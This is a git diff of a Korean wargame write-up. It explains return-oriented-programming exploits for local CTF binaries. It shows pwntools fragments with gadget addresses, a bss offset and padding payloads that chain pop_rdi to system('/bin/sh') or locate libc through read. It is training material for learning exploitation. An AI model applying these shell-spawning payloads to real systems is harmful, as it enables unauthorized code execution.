@@ -4,7 +4,7 @@
 
 You can use write, read, system and /bin/sh  
 gdb를 통해 디버깅하여 system_plt = 0x4010b0임을 알 수 있고, pop_rdi 가젯의 주소와 /bin/sh의 주소를 확인할 수 있다.
-버퍼의 크기와 dummy, SFP를 덮은 뒤 ret를 pop_rdi 가젯의 주소로 덮는다. pop_rdi 가젯을 활용하면 rdi에 /bin/sh의 주소를 넣은 뒤 system 함수의 plt로 return하여 system("/bin/sh")를 호출하게 된다.
+버퍼의 크기와 dummy, SFP를 덮은 뒤 ret를 pop_rdi 가젯의 주소  로 덮는다. pop_rdi 가젯을 활용하면 rdi에 /bin/sh의 주소를 넣은 뒤 system 함수의 plt로 return하여 system("/bin/sh")를 호출하게 된다.
 
 
 ```python
@@ -106,19 +106,18 @@ p.interactive()
 ## orc 
 
 You can use only read  
-read를 사용하여 "/bin/sh"를 bss 영역에 쓸 수 있지만, system함수가 주어지지 않았으므로 라이브러리에서 찾아야 한다. read함수를 사용할 수 있으므로 현재 프로세스에서 libc_base를 구한 뒤 offset을 더하여 system 함수를 사용할 수 있다.  
-read_plt를 구하고, 
+read를 사용하여 "/bin/sh"를 bss 영역에 쓸 수 있지만, system함수가 주어지지 않았으므로 라이브러리에서 찾아야 한다. read함수를 사용할 수 있으므로 현재 프로세스에서 libc_base를 구한 뒤 offset을 더하여 system 함수를 사용할 수 있다. libc_base의 끝부분이 0이라면 맞게 찾은 것으로 볼 수 있다.
+read_plt를 구하고, system_plt를 구할 수 있다.
 
 ```python
 from pwn import *
 
 p = process("./orc")
 
-pop_ret = 0x08049022
-pop3_ret = 0x08049391
+pop_ret = 0x08049353
+pop3_ret = 0x08049351
 read_plt = 0x80490a0
-bss = 0x804c030 + 0x300
-main = 0x80492f3
+bss = 0x0804c02c + 0x300
 
 
 payload = b'A'*0x44
@@ -149,3 +148,9 @@ p.interactive()
 
 
 ## wolfman
+
+You can use only read, isn't it?  
+Brute force를 할 수 없다고 한다.
+
+
+
